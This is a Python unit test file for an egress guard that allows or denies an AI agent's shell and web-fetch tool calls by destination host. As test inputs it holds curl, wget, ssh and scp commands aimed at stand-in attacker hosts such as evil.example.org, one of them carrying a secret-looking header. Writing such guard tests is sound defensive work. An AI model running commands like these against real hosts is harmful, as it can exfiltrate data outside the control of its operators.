import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from forge_policies import params  # noqa: E402
from forge_policies.egress import egress_guard  # noqa: E402


def shell(command):
    return {"type": "tool_call", "target": "Bash", "data": {"name": "Bash", "arguments": {"command": command}}}


def fetch(url):
    return {"type": "tool_call", "target": "web_fetch", "data": {"name": "web_fetch", "arguments": {"url": url}}}


class EgressTest(unittest.TestCase):
    def make(self, **over):
        cfg = params.load_defaults()["egress"]
        cfg.update(over)
        return egress_guard(**cfg)

    def result(self, ev, event):
        out = ev(event)
        return out["result"] if out else None

    def test_default_denies_external(self):
        ev = self.make()
        self.assertEqual(self.result(ev, fetch("https://evil.example.org/x")), "DENY")
        self.assertEqual(self.result(ev, shell("curl -s https://evil.example.org/x")), "DENY")
        self.assertEqual(self.result(ev, shell("ssh admin@box.example.org ls")), "DENY")
        self.assertEqual(self.result(ev, shell("scp f user@box.example.org:/tmp")), "DENY")

    def test_loopback_allowed(self):
        ev = self.make()
        self.assertIsNone(ev(fetch("http://localhost:8080/h")))
        self.assertIsNone(ev(shell("curl http://127.0.0.1:3000/")))
        self.assertIsNone(ev(shell("curl -s localhost:3000")))

    def test_subdomain_and_deny_wins(self):
        ev = self.make(allow_hosts=["example.com"], deny_hosts=["bad.example.com"])
        self.assertIsNone(ev(fetch("https://api.example.com/")))
        self.assertEqual(self.result(ev, fetch("https://bad.example.com/")), "DENY")
        self.assertEqual(self.result(ev, fetch("https://notexample.com/")), "DENY")

    def test_empty_allow_only_deny_list(self):
        ev = self.make(allow_hosts=[], deny_hosts=["bad.example.com"])
        self.assertIsNone(ev(fetch("https://ok.example.org/")))
        self.assertEqual(self.result(ev, shell("wget https://bad.example.com/f")), "DENY")

    def test_unparsed_network_command_asks(self):
        ev = self.make()
        self.assertEqual(self.result(ev, shell("curl -s")), "ASK")
        self.assertEqual(self.result(ev, fetch("not a url")), "ASK")
        ev = self.make(action_unparsed="DENY")
        self.assertEqual(self.result(ev, shell("curl")), "DENY")

    def test_non_network_and_other_phases_ignored(self):
        ev = self.make()
        self.assertIsNone(ev(shell("ls -la && echo hi")))
        self.assertIsNone(ev({"type": "response", "data": "https://evil.example.org"}))

    def test_reason_names_host_only(self):
        out = self.make()(shell("curl -H 'X: s3cr3t' https://evil.example.org/p?k=v"))
        self.assertIn("evil.example.org", out["reason"])
        self.assertNotIn("s3cr3t", out["reason"])
        self.assertNotIn("k=v", out["reason"])


if __name__ == "__main__":
    unittest.main()
